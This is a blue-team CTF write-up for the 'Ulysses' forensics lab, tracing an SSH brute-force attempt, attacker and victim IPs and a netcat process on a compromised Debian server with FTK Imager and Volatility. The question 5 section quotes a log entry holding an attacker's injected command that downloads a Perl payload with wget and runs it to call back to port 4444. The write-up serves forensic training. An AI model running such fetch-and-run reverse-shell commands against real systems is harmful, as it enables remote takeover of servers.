# 💻 Ulysses  
📌Link to the lab -> [https://cyberdefenders.org/blueteam-ctf-challenges/ulysses/]

### 📓 Scenario:
A research server was flagged for suspicious activity after multiple failed authentication attempts. Analysts detected a brute-force attack, unauthorized outbound connections, and possible persistence mechanisms. Using Volatility,
a custom Debian5_26 profile was loaded to analyze memory dumps and identify malicious processes. Your task is to investigate forensic artifacts, determine the attacker's entry point, and uncover any deployed payloads.

The image verifies the Volatility profile integration and displays the initial process list from the compromised system.

### ❓Questions❓:

#### ❔  1: The attacker was performing a Brute Force attack. What account triggered the alert?

$${\color{purple}__Identification\space of\space the\space Targeted\space Account\space During\space SSH\space Brute-Force\space Activity__}$$

$${\color{red}__Analysis__}$$

To determine the account targeted during the suspected brute-force attack, authentication logs were examined using FTK Imager. Since brute-force attacks rely on repeated authentication attempts against user accounts, system logs containing SSH authentication events provide valuable evidence regarding the attacker's actions and intended target.

The investigation focused on the /var/log/auth.log file, which records authentication-related events generated by the SSH daemon (sshd). Analysis of the log entries revealed a high volume of failed login attempts originating from the IP address 192.168.56.1. Multiple entries contained messages such as "Invalid user ulysses" and "Failed password for invalid user _ulysses_", indicating that the attacker repeatedly attempted to authenticate using the account name ulysses.

The timestamps show numerous consecutive authentication failures occurring within a short period, which is consistent with automated password-guessing activity. The repeated use of the same username across multiple connection attempts demonstrates that the account name was the primary target of the brute-force attack.

$${\color{yellow}__Evidence \space Interpretation__}$$

The authentication logs provide direct evidence that the attacker targeted the ulysses account during the brute-force campaign. The repeated SSH login attempts against this username, combined with continuous password failures from the same source IP address, indicate a systematic effort to gain unauthorized access through credential guessing.

The fact that the system reports "Invalid user ulysses" suggests that the account either did not exist at the time of the attack or was incorrectly identified by the attacker. Nevertheless, the logs clearly establish that ulysses was the account name used throughout the brute-force activity and therefore triggered the security alert.

#### ❔  2: During investigating the logs. How many failed login attempts were alerted by the same user?

$${\color{purple}__Quantification\space of\space Failed\space SSH\space Authentication\space Attempts\space Against\space the\space Targeted\space Account__}$$
$${\color{red}__Analysis__}$$

Following identification of the targeted account, a detailed review of the SSH authentication logs was performed to determine the extent of the brute-force activity. The relevant log file (/var/log/auth.log) was extracted from the forensic image using FTK Imager to facilitate keyword searching and event correlation outside of the forensic browser.

The exported log was examined for SSH-related authentication events by searching for the keyword _"ssh2"_, which is present in SSH authentication records generated by the OpenSSH daemon. The review identified numerous failed login attempts associated with the username ulysses originating from the source IP address 192.168.56.1. These entries included events such as "Invalid user ulysses", "Failed password for invalid user ulysses", and PAM authentication failure messages.

The search results indicated a total of _32_ occurrences associated with the SSH brute-force activity. The repeated authentication failures within a narrow timeframe are characteristic of an automated password-guessing attack rather than normal user behavior. Exporting the log file enabled more efficient searching and validation of the attack pattern while preserving the integrity of the original forensic image.

$${\color{yellow}__Evidence \space Interpretation__}$$

The presence of 32 failed SSH authentication events targeting the same account strongly supports the conclusion that the system was subjected to a brute-force attack. The concentration of failures from a single source IP address and the repetitive nature of the log entries indicate a deliberate attempt to gain unauthorized access through credential guessing.

From an investigative perspective, these events establish both the attacker's intended target and the intensity of the attack. The evidence demonstrates a sustained authentication campaign against the account ulysses, providing an important indicator of the attacker's initial access attempts and contributing to the overall incident timeline.

#### ❔  3: What kind of system runs on the targeted server?

$${\color{purple}__Identification\space of\space the\space Operating\space System\space Running\space on\space the\space Compromised\space Server\space__}$$
$${\color{red}__Analysis__}$$

To determine the operating system deployed on the target host, system installation records were examined within the forensic disk image using FTK Imager. Identifying the operating system is an important preliminary step in a forensic investigation, as it provides context for artifact locations, system behavior, log structures, and potential attack vectors.

The analysis focused on files located in the /var/log/installer directory, which contains information generated during the operating system installation process. Within this directory, the file lsb-release was reviewed and found to contain distribution metadata describing the installed operating system.

The file contents identified the system as:

Distribution ID: Debian
Distribution Release: 5.0 (Lenny)
Distribution Description: Debian GNU/Linux Installer

This evidence confirms that the compromised server was running Debian GNU/Linux 5.0 (Lenny). The finding is consistent with the previously generated Volatility profile used during memory analysis and provides important context for understanding the system's configuration, services, and forensic artifacts.

$${\color{yellow}__Evidence \space Interpretation__}$$

The installation records provide reliable evidence regarding the operating system originally installed on the server. Because the information originates from installation-related logs and configuration files, it represents a trustworthy source for identifying the platform under investigation.

The server's use of _Debian 5.0_ (Lenny) is noteworthy because it is a legacy _Linux_ distribution. Older operating systems frequently contain outdated software packages and may be more susceptible to exploitation if security updates are no longer available or have not been applied. This information helps analysts understand the environment targeted by the attacker and supports further investigation into Linux-specific persistence mechanisms, authentication activity, and service configurations.

#### ❔  4: What is the victim's IP address?

$${\color{purple}__Identification\space of\space the\space Victim\space Host\space IP\space Address\space Through\space Memory\space -\space Based\space Network\space Analysis__}$$
$${\color{red}__Analysis__}$$

To identify the IP address assigned to the compromised server, network connection artifacts were extracted from the memory image using the Volatility Framework's linux_netstat plugin. Unlike disk-based analysis, memory forensics provides visibility into active and recently established network connections present at the time the memory acquisition was performed.

The linux_netstat plugin enumerates network sockets and associates them with running processes, allowing investigators to identify listening services, active connections, and communication endpoints. Examination of the output revealed several network connections involving the IP address 192.168.56.102. Notably, connections were observed between _192.168.56.102_ and _192.168.56.1_, including established sessions associated with the processes _sh (PID 2065) and nc (PID 2169)_.

Because _192.168.56.102_ appears as the local endpoint in multiple connections and hosts services listening on common ports such as SSH (22) and SMTP (25), it can be identified as the IP address assigned to the compromised system. The remote system, 192.168.56.1, represents an external host communicating with the victim server.

$${\color{yellow}__Evidence\space Interpretation__}$$

The memory-resident network artifacts clearly indicate that _192.168.56.102_ is the victim machine's IP address. This conclusion is supported by the fact that the address is consistently associated with local services and serves as the source endpoint for established network connections.

The observed communication between 192.168.56.102 and 192.168.56.1 is particularly significant because it suggests interaction between the compromised host and another system on the network. The association of these connections with shell (sh) and Netcat (nc) processes may indicate post-compromise activity, potentially involving remote command execution or attacker-controlled communications. These findings warrant further investigation into the related processes and connection history.

#### ❔  5: What are the attacker's two IP addresses?

$${\color{purple}__Identification\space of\space Attacker\space IP\space Addresses\space from\space Network\space and\space Exim4\space Log\space Evidence__}$$
$${\color{red}__Analysis__}$$

Volatility linux_netstat was used to identify active and recently closed network connections from the memory image. The output showed the victim host 192.168.56.102 communicating with 192.168.56.1 over suspicious established connections associated with sh/2065 and nc/2169, including ports 4444 and 8888. It also showed a closed SMTP connection between 192.168.56.102:25 and 192.168.56.101:37202, indicating interaction with the Exim4 mail service.

To validate the SMTP-related connection, Exim4 logs were reviewed in FTK Imager under /var/log/exim4. The rejectlog contained a rejected SMTP transaction from 192.168.56.101, using hostname abcde.com. The log entry also embedded commands referencing 192.168.56.1, including a download of c.pl from http   :   //192.168.56.1/c   .   pl and execution of the Perl payload connecting back to 192.168.56.1:4444.

The relevant Exim4 evidence is:

2011-02-06 15:08 H=(abcde.com) [192.168.56.101] temporarily rejected MAIL <root@local   .   com>: failed to expand ACL string "... wget http   :   //192.168.56.1/c   .   pl -O /tmp/c.pl; perl /tmp/c   .   pl 192.168.56.1 4444; sleep 1000000 ..."

$${\color{yellow}__Evidence \space Interpretation__}$$

The attacker-associated IP addresses are 192.168.56.101 and 192.168.56.1.

192.168.56.101 is identified as the source of the malicious SMTP transaction against Exim4. 192.168.56.1 is identified as the payload hosting and callback address because the rejected Exim4 command attempted to download c.pl from that host and execute it with a connection to port 4444. The combination of memory network evidence and Exim4 reject logs shows that one attacker-controlled system delivered the SMTP exploit attempt, while the other hosted or received the deployed payload connection.

#### ❔  6: What is the nc service PID number that was running on the server?

$${\color{purple}__Identification\space of\space the\space Netcat\space (nc)\space Process\space Running\space on\space the\space Compromised\space Host__}$$
$${\color{red}__Analysis__}$$

To identify the process ID (PID) of the Netcat service running on the compromised system, the Volatility linux_netstat plugin was executed against the memory image using the custom LinuxDebian5_26x86 profile. This plugin correlates active network sockets with the processes that own them, allowing investigators to associate network activity with specific executables.

Analysis of the network connections revealed an established TCP session between the victim host 192.168.56.102 and the remote host 192.168.56.1 over port 8888. The connection was associated with the process nc (Netcat), which was displayed in the process column alongside its PID.

The output identified the Netcat process as:

Process Name: nc
PID: _2169_

This process was actively maintaining a network connection at the time the memory image was acquired, making it a significant artifact in the investigation.

$${\color{yellow}__Evidence \space Interpretation__}$$

The presence of a running Netcat process is highly relevant because Netcat is frequently used during post-exploitation activities for remote shell access, tunneling, file transfers, and data exfiltration. The established connection to 192.168.56.1 suggests that the process was actively communicating with an external system at the time of memory capture.

When correlated with other findings, including attacker-related IP addresses and shell processes observed in memory, the Netcat process provides additional evidence of unauthorized remote activity occurring on the compromised server. The identified PID (2169) allows investigators to pivot into further analysis of process memory, command-line arguments, open file descriptors, and network communications.
